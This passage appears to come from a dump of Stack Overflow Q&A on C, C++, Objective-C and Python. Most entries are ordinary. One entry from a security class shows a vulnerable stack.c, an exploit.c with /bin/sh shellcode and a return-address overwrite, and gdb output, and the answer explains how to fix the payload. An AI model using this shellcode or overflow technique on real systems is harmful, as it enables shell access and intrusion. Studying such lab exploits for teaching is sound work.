<p>Thanks</p>
","9530","","<p>You have a circular dependency.  You need to break the circular dependency by using a <em>forward declaration</em>.  A forward declaration says ""this is the name of something, but I don't know the full definition of it"".</p>

<p>For example:</p>

<pre><code>// In VC.h

// Forward declaration of an Objective-C class.  After this, you can now use
// pointers to CustomObject, but you can't cell methods or access properties
// of those objects
@class CustomObject;

@interface MyViewController
{
    CustomObject *obj;
}
@end
</code></pre>

<p>Then, in the implementation files, you can include both header files with no problems.</p>
"
"<p>I have multiple threads reading same int variable. 
and one thread is writing the value. </p>

<p>I don't care about the race condition. </p>

<p>only my concern is writing and reading int value at same time is memory safe ?</p>

<p>and it will not result in any application crash . </p>
","9530","","<p>Yes, on x86 and x86-64, as long as the value you're reading is aligned properly.  32-bit <code>int</code>s, they need to be aligned on a 4-byte boundary in order for access to be <a href=""http://en.wikipedia.org/wiki/Atomicity_%28programming%29"" rel=""nofollow""><em>atomic</em></a> when reading or writing, which will almost always be the case unless you go out of your way to create unaligned <code>int</code>s (say, by using a packed structure or by doing casting/pointer arithmetic with byte buffers).</p>

<p>You probably also want to declare your variable as <code>volatile</code> so that the compiler will generate code that will re-fetch the variable from memory every time it's accessed.  That will prevent it from making optimizations such as caching it in a register when it might be altered by another thread.</p>
"
"<p>I have a file that's 21056 bytes.</p>

<p>I've written a program in C that reads the entire file into a buffer, and then uses multiple search algorithms to search the file for a token that's 82 chars.</p>

<p>I've used all the implementations of the algorithms from the <a href=""http://igm.univ-mlv.fr/~lecroq/string/node1.html"">“Exact String Matching Algorithms”</a> page. I've used: KMP, BM, TBM, and Horspool. And then I used <code>strstr</code> and benchmarked each one.</p>

<p>What I'm wondering is, each time the <code>strstr</code> outperforms all the other algorithms. The only one that is faster sometimes is BM.</p>

<p>Shouldn't <code>strstr</code> be the slowest?</p>

<p>Here's my benchmark code with an example of benchmarking BM:</p>

<pre><code>double get_time()
{
    LARGE_INTEGER t, f;
    QueryPerformanceCounter(&amp;t);
    QueryPerformanceFrequency(&amp;f);
    return (double)t.QuadPart/(double)f.QuadPart;
}
</code></pre>



<pre><code>before = get_time();
BM(token, strlen(token), buffer, len);
after = get_time();
printf(""Time: %f\n\n"", after - before);
</code></pre>

<p>Could someone explain to me why <code>strstr</code> is outperforming the other search algorithms? I'll post more code on request if needed.</p>
","9530","","<p>Without seeing your code, it's hard to say exactly.  <code>strstr</code> is heavily optimized, and usually written in assembly language.  It does things like reading data 4 bytes at a time and comparing them (bit-twiddling if necessary if the alignment isn't right) to minimize memory latency.  It can also take advantage of things like SSE to load 16 bytes at a time.  If your code is only loading one byte at a time, it's probably getting killed by memory latency.</p>

<p>Use your debugger and step through the disassembly of <code>strstr</code> -- you'll probably find some interesting things in there.</p>
"
"<p>I'm dealing with some pre-ANSI C syntax. See I have the following function call in one conditional</p>

<pre><code> BPNN *net;
 // Some more code
 double val;
 // Some more code, and then,
 if (evaluate_performance(net, &amp;val, 0)) {
</code></pre>

<p>But then the function <code>evaluate_performance</code> was defined as follows (<em>below</em> the function which has the above-mentioned conditional):</p>

<pre><code>evaluate_performance(net, err)
BPNN *net;
double *err;
{
</code></pre>

<p>How come <code>evaluate_performance</code> was defined with two parameters but called with three arguments? What does the '0' mean?</p>

<p>And, by the way, I'm pretty sure that it isn't calling some other <code>evaluate_performance</code> defined elsewhere; I've <code>grep</code>ed through all the files involved and I'm pretty sure the we are supposed to be talking about the same <code>evaluate_performance</code> here.</p>

<p>Thanks!</p>
","9530","","<p>If you call a function that doesn't have a declared prototype (as is the case here), then the compiler assumes that it takes an arbitrary number and types of arguments and returns an <code>int</code>.  Furthermore, <code>char</code> and <code>short</code> arguments are promoted to <code>int</code>s, and <code>float</code>s are promoted to <code>double</code>s (these are called the <em>default argument promotions</em>).</p>

<p>This is considered bad practice in new C code, for obvious reasons -- if the function doesn't return <code>int</code>, badness could ensure, you prevent the compiler from checking that you're passing the correct number and types of parameters, and arguments might get promoted incorrectly.</p>

<p>C99, the latest edition of the C standard, removes this feature from the language, but in practice many compilers still allow them even when operating in C99 mode, for legacy compatibility.</p>

<p>As for the extra parameters, they are technically <strong>undefined behavior</strong> according to the C89 standard.  But in practice, they will typically just be ignored by the runtime.</p>
"
"<p>How do I traverse the contents of a zip file in python without having to extract them?</p>

<p>If extracting is the only way, is it efficient if I create a unique temp folder and extract them there then traverse and remove the temp folder afterwards?</p>
","9530","","<p>Use the <a href=""http://docs.python.org/library/zipfile.html#zipfile.ZipFile.namelist"" rel=""nofollow""><code>namelist()</code></a> method of the <code>ZipFile</code> class to get a list of all of the filenames in the archive without having to extract them.  For example:</p>

<pre><code>import zipfile

myzip = zipfile.ZipFile('myzip.zip', 'r')
filenames = myzip.namelist()
# Do something with filenames
</code></pre>
"
"<p>I need to get (or pipe) the output from a process that is already running, using the windows api.</p>

<p>Basically my application should allow the user to select a window to pipe the input from, and all input will be displayed in a console. I would also be looking on how to get a pipe on stderr later on.</p>

<p>Important: I did not start the process using CreateProcess() or otherwise. The process is already running, and all I have is the handle to the process (returned from GetWindowThreadProcessId()).</p>
","9530","","<p>Whatever you're trying to do, you're doing it wrong.  If you're interacting with a program for which you have the source code, create a defined interface for your IPC: create a socket, a named pipe, windows messaging, shared memory segment, COM server, or whatever your preferred IPC mechanism is.  Do not try to graft IPC onto a program that wasn't intending to do IPC.</p>

<p>You have no control over how that process's stdout was set up, and it is not yours to mess with.  It was created by its parent process and handed off to the child, and from there on out, it's in control of the child.  <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2009/12/02/9931183.aspx"" rel=""nofollow"">You don't go in and change the carpets in somebody else's house</a>.</p>

<p>Do not even think of going into that process, trying to <code>CloseHandle</code> its stdout, and <code>CreateFile</code> a new stdout pointing to your pipe.  That's a recipe for disaster and will result in quirky behavior and ""impossible"" crashes.</p>

<p>Even if you could do what you wanted to do, <a href=""http://blogs.msdn.com/b/oldnewthing/archive/2005/06/07/426294.aspx"" rel=""nofollow"">what would happen if two programs did this</a>?</p>
"
"<p>I have a preprocessor macro defined in build settings</p>

<pre><code>FOO=BAR
</code></pre>

<p>That value I want to massage into an Objective-C string literal that can be passed to a method.  The following #define does not work, but it should demonstrate what I am trying to achieve:</p>

<pre><code> #define FOOLITERAL @""FOO"" //want FOOLITERAL to have the value of @""BAR""

 myMethodThatTakesAnNSString(FOOLITERAL);
</code></pre>

<p>I expect that I am just missing the obvious somehow, but I cannot seem to find the right preprocessor voodoo to get what I need.</p>
","9530","","<p>Use the <em>stringizing operator</em> <code>#</code> to make a C string out of the symbol.  However, due to a quirk of the preprocessor, you need to use two extra layers of macros:</p>

<pre><code>#define FOO BAR
#define STRINGIZE(x) #x
#define STRINGIZE2(x) STRINGIZE(x)
#define FOOLITERAL @ STRINGIZE2(FOO)
// FOOLITERAL now expands to @""BAR"" 
</code></pre>

<p>The reason for the extra layers is that the stringizing operator can only be used on the arguments of the macro, not on other tokens.  Secondly, if an argument of a macro has the stringizing operator applied to it in the body of the macro, then that argument is <em>not</em> expanded as another macro.  So, to ensure that <code>FOO</code> gets expanded, we wrap in another macro, so that when <code>STRINGIZE2</code> gets expanded, it also expands <code>FOO</code> because the stringizing operator does not appear in that macro's body.</p>
"
"<p>I want to create a method like this:</p>

<pre><code>- (void) checkAndUpdateStringProperty: (NSString **) property{
   if (...) 
      *property = @""whatever"";
}
</code></pre>

<p>I want to use this to pass in a property for the same class:</p>

<pre><code>- (void) somewhereElse{
       ....
       [self checkAndUpdateStringProperty: &amp;self.productName];
}
</code></pre>

<p>But this gives a syntax error, saying ""Address of property expression requested"". Any reason why? If I replace the class property with a local variable, it works fine:</p>

<pre><code>- (void) somewhereElse{
       NSString *name = nil;
       [self checkAndUpdateStringProperty: &amp;name];
}
</code></pre>
","9530","","<p>Properties should only ever be accessed through their getter and setter methods, with the exception of initializing and deinitializing them in the object's <code>init</code> and <code>dealloc</code> methods (when the object is not in a fully consistent state) -- accessing them any other way defeats their purpose and does not respect their attributes (<code>retain</code>, <code>copy</code>, etc.).</p>

<p>The reason why it doesn't compile is because property accessors are syntactic sugar for method calls, and you can't take the address of the return value of a method. <code>self.productName</code> is identical to <code>[self productName]</code>, and <code>&amp;[self productName]</code> makes no sense.</p>

<p>If you really want to do this, don't do it with a property, do it with just a regular variable (such as a local variable or ivar), and <em>document the semantics</em> of your function: does the calling function need to <code>release</code> the returned object?  Etc.  For example, the various Apple methods which take an <code>NSError**</code> specify that the error object which is returned, if any, is an autoreleased object, so you should not <code>release</code> it yourself unless you also <code>retain</code> it.</p>
"
"<p>I'm working on my buffer overflow project for my security class, I think I have everything set up right but when I run it I get:</p>

<pre><code>Program received signal SIGILL, Illegal Instruction.
0x08048500 in main(argc=4854718, argv=0x0804b008) at stack.c:22
22       fread(str,sizeof(char),517,badfile);
</code></pre>

<p>Heres stack.c</p>

<pre><code>int bof(char *str) 
{
    char buffer[12]; 
    /* The following statement has a buffer overflow problem */ 
    strcpy(buffer, str); 
    return 1; 
} 

int main(int argc, char **argv) 
{ 
    char str[517]; 
    FILE *badfile; 
    badfile = fopen(""badfile"", ""r""); 
    fread(str, sizeof(char), 517, badfile); 
    bof(str); 
    printf(""Returned Properly\n""); 
    return 1; 
}
</code></pre>

<p>here is exploit.c</p>

<pre><code>char code[]=

""\x31\xc0""                      // xorl         %eax,%eax

""\x50""                          // pushl        %eax

""\x68\x6e\x2f\x73\x68""          // pushl        $0x68732f6e

""\x68\x2f\x2f\x62\x69""          // pushl        $0x69622f2f

""\x89\xe3""                      // movl         %esp,%ebx

""\x99""                          // cltd

""\x52""                          // pushl        %edx

""\x53""                          // pushl        %ebx

""\x89\xe1""                      // movl         %esp,%ecx

""\xb0\x0b""                      // movb         $0xb,%al

""\xcd\x80""                      // int          $0x80

;

char retaddr[] = ""\x70\xF2\xFF\xBF"";

void main(int argc, char **argv)
{
    char strr[517];
    strr[0] = 'Z';
    strr[1] = 0;
    strr[2] = '\x00';
    char buffer[517];
    FILE *badfile;

    /* Initialize buffer with 0x90 (NOP instruction) */
    memset(buffer, 0x90, 517);

    /* You need to fill the buffer with appropriate contents here */
    //memcpy(buffer, ""EGG="", 4);

    memcpy(buffer, code, 24);

    memcpy(buffer+20,retaddr,4);

    memcpy(buffer+24,""\x00\x00\x00\x00"",4);


    /* Save the contents to the file ""badfile"" */
    badfile = fopen(""./badfile"", ""w"");
    fwrite(buffer,517,1,badfile);
    fclose(badfile);    
} 
</code></pre>

<p>Here is the stack at runtime.
Starting program: /home/john/stack </p>

<pre><code>Breakpoint 1, bof (
str=0xbffff2b7 ""1\300Phn/shh//bi\211\343\231RS\211\341p\362\377\277"")
at stack.c:13
13      strcpy(buffer, str);
(gdb) x/12xw $esp
0xbffff270: 0x00000205  0xbffff298  0x004a13be  0x0804b008
0xbffff280: 0xbffff2b7  0x00000205  0xb7fef6c0  0x00584ff4
0xbffff290: 0x00000000  0x00000000  0xbffff4c8  0x0804850f
(gdb) s
14      return 1;
(gdb) x/12xw $esp
0xbffff270: 0xbffff284  0xbffff2b7  0x004a13be  0x0804b008
0xbffff280: 0xbffff2b7  0x6850c031  0x68732f6e  0x622f2f68
0xbffff290: 0x99e38969  0xe1895352  0xbffff270  0x08048500
(gdb) c
Continuing.
</code></pre>

<p>Any idea why I'm getting SIGILL?</p>
","9530","","<p>Because you're executing illegal code.  In your <code>exploit.c</code>, you're overwriting offsets 20-23 with the return address -- those bytes were previously the <code>b0 0b cd 80</code> corresponding to the last two <code>mov $0xb,%al</code> and <code>int $0x80</code> instructions.  The zero bytes you put in there are illegal code.</p>

<p>Since the return address has to go at that specific offset for this target, you need to modify your shell code not to use that data.  I'd suggest either moving the shell code to after that offset and pointing the return address there, or putting in a jump over the return address so that the processor doesn't try to execute it.</p>
"
"<p>Say I want to spawn a process and run <code>execv</code> to execute a command like <code>ls</code> then this is how i do it:</p>

<pre><code>char * const parm[] = { ""/usr/bin/ls"",""-l"" , NULL };
if ((pid = vfork()) == -1)
    perror(""fork error"");
else if (pid == 0)
{
    execv(""/usr/bin/ls"", parm);
}
</code></pre>

<p>Now the question is that here I have hard coded where the <code>ls</code> command is present (<code>/usr/bin/ls</code>). Now suppose I do not know where a particular command is present and want to execute it then how do I go about it? I know in a regular shell the <code>PATH</code> variable is looked up to achieve the same, but in case of a C program using <code>execv</code> how do I achieve it?</p>
","9530","","<p>Use <a href=""http://linux.die.net/man/3/execvp"" rel=""nofollow""><code>execvp(3)</code></a> instead of <code>execv(3)</code>.  <code>execvp</code> and <code>execlp</code> work exactly like <code>execv</code> and <code>execl</code> respectively, except they search the <code>$PATH</code> environment variable for an executable (see the man page for full details).</p>
"
"<p>I'm trying to run several instances of a piece of code (2000 instances or so) concurrently in a computing cluster.  The way it works is that I submit the jobs and the cluster will run them as nodes open up every so often, with several jobs per node.  This seems to produce the same values for a good number of the instances in their random number generation, which uses a time-seed.  </p>

<p>Is there a simple alternative I can use instead?  Reproducibility and security are not important, quick generation of unique seeds is.  What would be the simplest approach to this, and if possible a cross platform approach would be good.  </p>
","9530","","<p>A combination of the PID and the time should be enough to get a unique seed.  It's not 100% cross-platform, but <a href=""http://linux.die.net/man/3/getpid"" rel=""nofollow""><code>getpid(3)</code></a> on *nix platforms and <a href=""http://msdn.microsoft.com/en-us/library/windows/desktop/ms683215%28v=vs.85%29.aspx"" rel=""nofollow""><code>GetProcessId</code></a> on Windows will get you 99.9% of the way there.  Something like this should work:</p>

<pre><code>srand((time(NULL) &amp; 0xFFFF) | (getpid() &lt;&lt; 16));
</code></pre>

<p>You could also read data from <code>/dev/urandom</code> on *nix systems, but there's no equivalent to that on Windows.</p>
"
"<p>Occasionally, when I am looking down the list of selectors that a object responds to, I see <code>hash</code> come up. For a while now, I have wondered what it meant, but I never came around to finding out.</p>

<p>I would really appreciate it if you could tell me what the selector does and common uses for doing so.</p>
","9530","","<p>It's used for implementing efficient <a href=""http://en.wikipedia.org/wiki/Hash_table"" rel=""nofollow"">hash tables</a> in associative array data types such as <a href=""http://developer.apple.com/library/mac/#documentation/cocoa/reference/foundation/classes/nsdictionary_class/Reference/Reference.html"" rel=""nofollow""><code>NSDictionary</code></a>.</p>
"
"<p>i am building an app that shows a random facebook profile picture but do not know how to make the profile id a random number. I can obviously change it randomly in the code but need it to be random. It is the second NSString down that i need to be random. ANy help would be much appreciated!</p>

<pre><code>- (IBAction) nextImagePush {
    NSString *prefix = @""http://graph.facebook.com/"";
    NSString *profileId = @""517418970"";
    NSString *suffix = @""/picture?type=large"";
    NSString* url= [NSString stringWithFormat:@""%@%@%@"", prefix, profileId, suffix];
    UIImage *img = [UIImage imageWithData:[NSData dataWithContentsOfURL:[NSURL URLWithString:url]]];
    [imageView setImage:img];
</code></pre>
","9530","","<p>It's easy to pick a random integer with a function such as <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man3/rand.3.html"" rel=""nofollow""><code>rand(3)</code></a>, <a href=""http://developer.apple.com/library/mac/#documentation/Darwin/Reference/ManPages/man3/random.3.html#//apple_ref/doc/man/3/random"" rel=""nofollow""><code>random(3)</code></a>, or <a href=""http://developer.apple.com/library/ios/#documentation/System/Conceptual/ManPages_iPhoneOS/man3/arc4random.3.html"" rel=""nofollow""><code>arc4random(3)</code></a> and then use <code>+[NSString stringWithFormat:]</code> to turn that into a string using the <code>%u</code> format specifier.</p>

<p>What's much harder is ensuring that the integer you pick corresponds to a <em>valid</em> Facebook user ID:</p>

<ul>
<li>Does Facebook document anywhere what the possible valid IDs are?</li>
<li>Are they always within a certain range?</li>
<li>Are all IDs in that range valid?</li>
<li>Is there any way to query the range of valid IDs?</li>
</ul>

<p>If the answer to all of those questions is ""yes"", then you can do it, otherwise it's going to be next to impossible unless Facebook provides an API for what you want, which I think is unlikely.</p>
"
"<p>I'm experiencing an access violation error when I try to call non static function.</p>

<p>my <code>.h</code> file looks like this.</p>

<pre><code>class World
{
public:
    World();
    virtual ~World();
    static void CALLBACK DispatchCallback(
        SIMCONNECT_RECV *pData,
        DWORD cbData,
        void *pContext
    );
    void Process(SIMCONNECT_RECV *pData, DWORD cbData);
    virtual void frameEvent();
    virtual void init();
};
</code></pre>

<p>Now in my .cpp file the init() function I call a function that return data to my callback function.</p>

<pre><code>SimConnect_CallDispatch(hSimConnect, DispatchCallback, NULL);
</code></pre>

<p>Which sends data to the <code>DisPatchCallback</code> function.</p>

<p>In this function the following code resides:</p>

<pre><code>void CALLBACK World::DispatchCallback(
    SIMCONNECT_RECV *pData,
    DWORD cbData,
    void *pContext)
{
    World *pThis = reinterpret_cast&lt;World*&gt;(pContext);
    pThis-&gt;Process(pData, cbData);
}
</code></pre>

<p>this function is a static function which creates a World object to call the Process function.</p>

<p>This works but it break on the line where it wants to access the frameEvent function.</p>

<pre><code>void World::Process(SIMCONNECT_RECV *pData, DWORD cbData)
{
    HRESULT hr;

    switch(pData-&gt;dwID)
    {
    case SIMCONNECT_RECV_ID_EVENT_FRAME:
        frameEvent(); //it breaks here frameEvent is a non static function
        break;
    }
}
</code></pre>

<blockquote>
  <p>Access violation reading location 0x00000000.</p>
</blockquote>

<p>Can someone point me to the right direction as to solve this issue.?</p>

<p>If you wonder I'm writing a plugin for Microsoft Flight Simulator X.</p>

<p>I'm trying to implement <code>simconnect.h</code> in a oo way. Msdn shows an example that I'm trying to implement.</p>

<pre><code>class CName
{
    void Dispatch();
    static void DispatchCallback(
        SIMCONNECT_RECV *pData,
        DWORD cbData,
        void *pContext
    );
    void Process(SIMCONNECT_RECV *pData, DWORD cbData);

    HANDLE hSimConnect; // use SimConnect_Open to set this value.
};

void CName::Dispatch()
{
    ::SimConnect_Dispatch(hSimConnect, &amp;CName;::DispatchCallback, this);
}

// static function
void CName::DispatchCallback(
    SIMCONNECT_RECV *pData,
    DWORD cbData,
    void *pContext)
{
    CName *pThis = reinterpret_cast&lt;CName*&gt;(pContext);
    pThis-&gt;Process(pData, cbData);
}

void CName::Process(SIMCONNECT_RECV *pData, DWORD cbData)
{
    // do processing of SimConnect data
}
</code></pre>

<p>I hope I gave enough information.</p>
","9530","","<p>You're passing <code>NULL</code> as the context parameter to <code>SimConnect_CallDispatch</code>, so your callback has no idea which <code>World</code> object to call <code>Process</code> on -- how could it possibly if you don't tell it?  Change the call to pass in <code>this</code> as the context parameter, like the example does:</p>

<pre><code>SimConnect_CallDispatch(hSimConnect, DispatchCallback, this);
</code></pre>
"
"<p>I want to have a variable that I can access anywhere by importing a header file but I also want it to be static in the sense that there is only one of them created.  In my .m file, I specify</p>

<pre><code>static BOOL LogStuff = NO;
</code></pre>

<p>and in the initialize method I set the logging value:</p>

<pre><code>+ (void)initialize
{
    LogStuff = ... //whatever
}
</code></pre>

<p>However I want to be able to access my variable anywhere by importing the .h file so I want to do something like this:</p>

<pre><code>static extern BOOL LogStuff;
</code></pre>

<p>but I'm not allowed to do that.  Is it possible to do the thing I'm trying to do?  Thanks</p>
","9530","","<p><code>static</code> in Objective-C means a different thing than <code>static</code> in a C++ class, in the context of static class data members and static class methods.  In C and Objective-C, a <code>static</code> variable or function at global scope means that that symbol has <em>internal linkage</em>.</p>

<p>Internal linkage means that that symbol is local to the current <em>translation unit</em>, which is the current source file (<code>.c</code> or <code>.m</code>) being compiled and all of the header files that it recursively includes.  That symbol cannot be referenced from a different translation unit, and you can have other symbols with internal linkage in other translation units with the same name.</p>

<p>So, if you have a header file declaring a variable as <code>static</code>, each source file that includes that header gets a <em>separate</em> global variable—all references to that variable within one source file will refer to the same variable, but references in different source files will refer to <em>different</em> variables.</p>

<p>If you want to have a single global variable, you can't have it in class scope like in C++.  One option is to create a global variable with <em>external linkage</em>: declare the variable with the <code>extern</code> keyword in a header file, and then in <strong>one</strong> source file, define it at global scope without the <code>extern</code> keyword.  Internal linkage and external linkage are mutually exclusive—you cannot have a variable declared as both <code>extern</code> and <code>static</code>.</p>

<p>An alternative, as <a href=""http://stackoverflow.com/questions/7642304/objective-c-static-extern-public-variables/7642360#7642360"">Panos suggested</a>, would be to use a class method instead of a variable.  This keeps the functionality within the scope of the class, which makes more sense semantically, and you can also make it <code>@private</code> if you so desire.  It does add a marginal performance penalty, but that's highly unlikely to be the bottleneck in your application (if you suspect it is, always profile first).</p>
"
"<p>I'm in the process of migrating a program from GLUT to SDL. In my current program pressing the <code>a</code> key results in a different response then pressing the <code>A</code> key.  This was pretty straightforward to do in GLUT as it the keyboard function callback passed in the ASCII value of the key that was pressed.  </p>

<pre><code>void keyPressedFn(unsigned char key, int x, int y){
    switch(key){
    case 'a':
    // do work for a
    break;
    case 'A':
    // do work for A
    break;
    }
}
</code></pre>

<p>I'm struggling to replicate similar functionality in SDL as pressing the <code>a</code> key produces the same response regardless of if SHIFT or CAPS LOCK are pressed as well.</p>

<p>Is there a simple way of replicating the above function in SDL?</p>

<p><strong>Edit</strong>: In the example above I only show how to handle one key, in practice however, I am going to have a list of about 15 keys that I want to respond to differently if the shift key is pressed as well.</p>
","9530","","<p>Check the keyboard modifiers that are present when you get a keydown event.  For example:</p>

<pre><code>while(SDL_PollEvent(&amp;event))
{
  switch(event.type)
  {
  case SDL_KEYDOWN:
    if(event.key.keysym.sym == SDLK_a)
    {
      if(event.key.keysym.mod &amp; KMOD_SHIFT)
      {
        // Handle 'A'
      }
      else
      {
        // Handle 'a'
      }
    }
    break;

  ...

  }
}
</code></pre>
"
"<p>I have a fixed-size array declared:</p>

<pre><code>int vals[25];
</code></pre>

<p>And I'd like to send the array to a function which will assign the values of vals:</p>

<pre><code>bool FetchValueArray(char* source, char* name, char* typeFormat, int count, void** destination)
{
    int i;
    char *t;
    t=strstr(source,name);
    if (t)
        if (destination != NULL)
        {
            for (i = 0;i &lt; count;i++)
                sscanf(t,typeFormat,destination[i]);
                return true;
        }
    return false;
}
</code></pre>

<p>This will essentially read everything at after a certain search string. For example:</p>

<pre><code>FetchValueArray(source,""CONFIG="",""%d"",15,vals);
</code></pre>

<p>Where ""CONFIG="" is in plain text, followed by 15 tab separated numeric values.</p>

<p>There's something here I'm far from <em>grokking</em> about indirection and fixed aized arrays thus I'd like to know if a fixed sized array can be sent as a parameter as void** (even if there is the leap of faith that the size of the array will be respected. Different issue.)</p>

<hr>

<p>tl;dr version</p>

<pre><code>int vals[25];
bool foo(int size,void** d);
foo(25,vals);
</code></pre>

<p>Why is this not allowed?</p>
","9530","","<p>Arrays decay into pointers to their first elements, and pointers to any type can be implicitly cast to <code>void*</code>.  Secondly, in order for array access to work properly, <code>FetchValueArray</code> needs to know how large each array element is.  You're trying to pass a <code>void**</code>, which is a pointer to a <code>void*</code>, so the array access treats each element as if it had the size of a <code>void*</code>, which is wrong -- your array elements have size <code>int</code>, which is not necessarily the same as the size of a <code>void*</code>.</p>

<p>So <code>void**</code> is wrong.  You instead need to pass in <code>void*</code>, which means ""pointer to unknown type"".  You can't use array indexing on a <code>void*</code>, since the compiler doesn't know the size of the underlying pointed-to type.  You need to help it out.  For example:</p>

<pre><code>bool FetchValueArray(char* source, char* name, char* typeFormat, int count, void* destination, size_t destElementSize)
{
    ...
    sscanf(t, typeFormat, (char*)destination + destElementSize * i);
    ...
}
...
FetchValueArray(source, ""CONFIG="", ""%d"", 15, vals, sizeof(vals[0]));
</code></pre>

<p>Here, we're performing the array indexing manually -- we're casting the <code>void*</code> to <code>char*</code>, which has a known pointed-to size (1 byte), and then performing the array offset by multiplying by the per-element size.  The result is a pointer to the proper memory location, which is what <code>sscanf</code> expects.</p>

<p>Be very careful here, though -- I think you should reconsider your design.  The compiler doesn't know the semantics of your function, so it can't verify that you're passing the proper arguments.  It's very easy to insert an accidental security vulnerability without realizing it here.  Think about if you might be better off with a different design that the compiler can verify more thoroughly.</p>
"
"<p>I'm looking for a function for C/C++ that behaves identically to PHP's md5() function -- pass in a string, return a one-way hash of that string.  I'm also open to other algorithms than md5() if they are as secure (or more secure), reasonably fast, and ideally one-way.</p>

<p>The reason I'm searching for said function is for the same purpose I would use PHP's md5() function: to store a one-way hash of a user's password in a database rather than the actual text of the user's password (in case the database's data is ever compromised, the user's passwords would still be relatively secret).</p>

<p>I've spent around two hours searching now.  All the code I've found either was for getting an MD5 of file data (instead of just a string), wouldn't compile, was for another programming language, or required an entire library (such as Crypto++, OpenSSL, hashlib++) to be added to my project, some of which are very large (is that really necessary when all I want is just one one-way string hashing function?).</p>

<p>Seeing as how this is a common need, I'm assuming someone has already written and made available exactly what I'm looking for.. can someone point me to it?</p>

<p>Thanks in advance.</p>
","9530","","<p>Seriously, use a library (OpenSSL is a good choice).  They're well-tested, and you can just drop them into your project without having to worry if you get the code right or not.  Don't worry about the size of the library, any functions you don't use will not be included in your final executable.</p>

<p>I'd also recommend avoiding MD5, as it has known weaknesses, in favor of something stronger such as SHA-256 or Blowfish.</p>

<p>But whichever algorithm and implementation you go with, do not forget to <a href=""http://en.wikipedia.org/wiki/Salt_%28cryptography%29"" rel=""nofollow"">salt your inputs</a>!</p>
"
"<p>I have the following code in both C and C++</p>

<pre><code>static void callback(char const* fname, int status)
{
  static char const* szSection = fname;
  //other stuff
}
</code></pre>

<p>In C++ this compiles fine without warning or error. In C I get the compilation error ""initializer is not constant"". Why does it differ between the two? I'm using the VC9 compiler for Visual Studio 2008 for both.</p>

<p>I'm trying to take a filename as input and set the path to the file the first time. All further callbacks are used to check for updates in the file, but it is not permissible for the path itself to change. Am I using the right variable in a char const*?</p>
","9530","","<p>Because the rules are different in C and C++.</p>

<p>In C++, <code>static</code> variables inside a function get initialized the first time that block of code gets reached, so they're allowed to be initialized with any valid expression.</p>

<p>In C, <code>static</code> variables are initialized at program start, so they need to be a compile-time constant.</p>
"
"<p>I am trying to figure out how to export this environmental variables from my minishell to bash.  Nothing happens when I use this code to export.  Am I doing something wrong</p>

<pre><code>      if(strcmp(istring, ""myexport"") ==0)     //This command shows parent enviornment
  {
      char * const *junk;
      execve(""/bin/bash"" , junk , myexp);
      return(1);
  }          
</code></pre>
","9530","","<p>You're passing an uninitialized pointer as the second argument to <code>execve</code>—most likely, that will fail with <code>EFAULT</code>, but if it does somehow magically succeed, <code>bash</code> is going to see garbage in its <code>argv</code> array of arguments and do something strange (most likely complain that some junk file doesn't exist).</p>

<p>If you don't want to pass any arguments, pass in a pointer to <code>NULL</code>, but it's good practice to at least pass in the name of the program being executed as <code>argv[0]</code>:</p>

<pre><code>char *const argv[] = {""bash"", NULL};
execve(""/bin/bash"", argv, myexp);
</code></pre>

<p>Also, what is <code>myexp</code>?  Is it a pointer to a <code>NULL</code>-terminated array of pointers to strings of the form <code>FOO=BAR</code>?</p>
"
"<p>This is an interview question that I found interesting.</p>

<p>Write a method that takes a pointer to a Node structure as a parameter and returns a complete copy of the passed-in data structure.</p>

<p>The Node structure contains two pointers to other Node structures.
For example, the method signature could look like so:</p>

<pre><code>Node* Copy(Node* root);
</code></pre>

<hr>

<p><strong>Note</strong> -  Do not make any assumptions about the data structure – it could be a tree, linked list, graph, etc.</p>

<p><em>How can this be done for any data structure ?</em></p>
","9530","","<p>In the generic graph case, you need a mapping from nodes in the original graph to nodes in the new graph, so that when a cycle is encountered, the proper link gets created.  If you happen to have extra temporary space in each node, large enough to hold a pointer, then you can store the mapping directly in the nodes; otherwise, you'll need to use an external map, such as an associative array or hash table.</p>

<p>Then it's just a matter of traversing the graph, copying nodes, and looking up the corresponding edges.  Something like this:</p>

<pre><code>struct Node
{
    Node(int _data) : data(_data) { memset(links, 0, sizeof(links)); }

    int data;
    Node *links[2];
}

Node *Copy(Node *root)
{
    typedef std::map&lt;Node*, Node*&gt; NodeMap;
    NodeMap nodeMap;
    std::deque&lt;Node*&gt; nodesToVisit;

    // Set up initial new root and mapping for the root
    Node *newRoot = new Node(root-&gt;data);
    nodeMap[root] = newRoot;

    // Breadth-first search the graph
    nodesToVisit.push_back(root);

    while(!nodesToVisit.empty())
    {
        Node *cur = nodesToVisit.front();
        nodesToVisit.pop_front();

        Node *newCur = nodeMap[cur];
        for(int i = 0; i &lt; 2; i++)
        {
            Node *link = cur-&gt;links[i];
            if(link)
            {
                // If we've already created the corresponding node for this
                // link, use that.  Otherwise, create it and add it to the map.
                NodeMap::iterator mappedLink = nodeMap.find(link);
                if(mappedLink != nodeMap.end())
                {
                    newCur-&gt;links[i] = mappedLink-&gt;second;
                }
                else
                {
                    Node *newLink = new Node(link-&gt;data);
                    nodeMap[link] = newLink;
                    newCur-&gt;links[i] = newLink;
                    nodesToVisit.push_back(link);
                }
            }
        }
    }

    return newRoot;
}
</code></pre>
"
"<p>My Question is related to <a href=""http://stackoverflow.com/questions/7680193/sigsegv-within-stdsort-how-to-narrow-it-down"">this</a> as I solved the problem, I wrote my own sorting algorithm (a simple insertion sort), and it works. I am quite surprised by this as I thought that the standard library is well-tested. Are there any known special cases in which <code>std::sort</code> might mess up?</p>
","9530","","<p>No, it's highly unlikely that there are any known bugs in any of the common C++ standard library implementations of <code>std::sort</code>.  It's rigorously tested.</p>

<p>If you see a crash or incorrect results, it's almost certainly because you didn't adhere to the contract: either you passed in invalid arguments, or your comparator does not obey the requirements for a <a href=""http://en.wikipedia.org/wiki/Strict_weak_ordering"" rel=""nofollow"">strict weak ordering</a> (irreflexivity, asymmetry, transitivity, and transitivity of equivalence).</p>
"
"<p>I'd like to create a C++ ostream object that only outputs anything if a condition holds true, to use for debugging. What would be the easiest way to do this? I know that boost has classes that make this easy, but I'd like to know if there's a simple way to do it without boost. The documentation makes it seem like subclassing ostream::sentry would make this possible, but I can't find any source saying that's something that you can/should do.</p>
","9530","","<p>Don't subclass, it's easier to use a wrapper:</p>

<pre><code>class MaybeOstream
{
public:
    MaybeOstream(std::ostream&amp; stream_) : stream(stream_), bOutput(true) {}

    void enable(bool bEnable) { bOutput = bEnable; }

    template&lt;typename T&gt;
